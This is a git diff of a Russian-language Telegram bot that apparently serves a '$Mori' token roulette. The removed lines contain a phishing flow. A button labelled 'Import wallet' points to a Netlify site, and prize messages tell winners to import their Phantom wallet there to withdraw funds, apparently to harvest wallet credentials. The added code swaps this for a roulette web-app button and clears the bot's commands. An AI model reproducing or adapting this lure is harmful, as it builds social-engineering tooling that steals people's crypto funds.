@@ -1,9 +1,10 @@
 import os
 import json
 import logging
+import asyncio
 from pathlib import Path
 from dotenv import load_dotenv
-from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 from telegram.constants import ParseMode
 
@@ -92,24 +93,36 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Сохраняем нового пользователя
             save_user_data()
         
-        # Этот бот только для получения данных от сайта phantommori (кошелек)
-        # Создаем кнопку для открытия сайта с кошельком
-        wallet_url = 'https://flourishing-cheesecake-87caf4.netlify.app/'
+        # Создаем кнопку для открытия рулетки
         keyboard = [
-            [KeyboardButton("🔗 Импортировать кошелек", web_app=WebAppInfo(url=wallet_url))]
+            [InlineKeyboardButton("🎰 Открыть рулетку", web_app=WebAppInfo(url=get_web_app_url()))]
         ]
-        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+        reply_markup = InlineKeyboardMarkup(keyboard)
         
         # Используем effective_message для большей надежности
         message = update.effective_message
         
         if message:
-            await message.reply_text(
+            # Отправляем сообщение и удаляем постоянную клавиатуру
+            sent_msg = await message.reply_text(
                 f"Привет, {update.effective_user.first_name}! 👋\n\n"
-                f"💼 Это бот для импорта кошелька Phantom.\n\n"
-                f"Нажмите кнопку ниже, чтобы открыть сайт и импортировать кошелек:",
+                f"🎰 Добро пожаловать в рулетку $Mori!\n\n"
+                f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                 reply_markup=reply_markup
             )
+            
+            # Удаляем постоянную клавиатуру отдельным сообщением (будет удалено автоматически)
+            try:
+                remove_msg = await context.bot.send_message(
+                    chat_id=user_id,
+                    text=" ",
+                    reply_markup=ReplyKeyboardRemove(remove_keyboard=True)
+                )
+                # Удаляем служебное сообщение через небольшую задержку
+                await asyncio.sleep(0.5)
+                await context.bot.delete_message(chat_id=user_id, message_id=remove_msg.message_id)
+            except Exception as e:
+                logger.warning(f"Не удалось удалить клавиатуру: {e}")
             logger.info(f"Sent start message to user {user_id}")
         else:
             logger.error(f"No message found in update for user {user_id}")
@@ -224,21 +237,13 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             save_user_data()
             logger.info(f"Data saved to file. Balance for user {user_id}: {new_balance} $Mori")
             
-            # Создаем кнопку для импорта кошелька (обычная ссылка)
-            wallet_url = 'https://flourishing-cheesecake-87caf4.netlify.app/'
-            keyboard = [
-                [InlineKeyboardButton("🔗 Импортировать кошелек", url=wallet_url)]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
             # Отправляем сообщение в чат
             user_name = update.effective_user.first_name or "Пользователь"
             current_balance = user_balances[user_id]
             message_text = (
                 f"🎉 Поздравляем, {user_name}!\n\n"
                 f"🎰 Вы выиграли: {prize} $Mori!\n\n"
-                f"💰 Ваш баланс: {current_balance} $Mori\n\n"
-                f"💵 Чтобы вывести средства, нажмите кнопку ниже и импортируйте кошелек:"
+                f"💰 Ваш баланс: {current_balance} $Mori"
             )
             
             logger.info(f"Attempting to send message to chat {chat_id}")
@@ -251,8 +256,7 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             try:
                 sent_message = await context.bot.send_message(
                     chat_id=chat_id,
-                    text=message_text,
-                    reply_markup=reply_markup
+                    text=message_text
                 )
                 logger.info(f"✅ Congratulations message sent successfully!")
                 logger.info(f"Message ID: {sent_message.message_id}, Chat ID: {sent_message.chat.id}")
@@ -272,9 +276,7 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
                     fallback_text = (
                         f"🎉 Поздравляем, {user_name}!\n\n"
                         f"🎰 Вы выиграли: {prize} $Mori!\n\n"
-                        f"💰 Ваш баланс: {current_balance} $Mori\n\n"
-                        f"💵 Чтобы вывести средства, перейдите по ссылке и импортируйте кошелек:\n"
-                        f"🔗 {wallet_url}"
+                        f"💰 Ваш баланс: {current_balance} $Mori"
                     )
                     sent_message = await context.bot.send_message(
                         chat_id=chat_id,
@@ -456,6 +458,16 @@ def main():
         application.add_handler(CommandHandler("reset", reset_spin))
         application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_web_app_data))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+        
+        # Удаляем menu button и команды при запуске
+        async def post_init(app: Application) -> None:
+            try:
+                await app.bot.delete_my_commands()
+                logger.info("Menu button и команды удалены")
+            except Exception as e:
+                logger.warning(f"Не удалось удалить menu button: {e}")
+        
+        application.post_init = post_init
         
         # Запускаем бота
         logger.info("Бот запущен...")
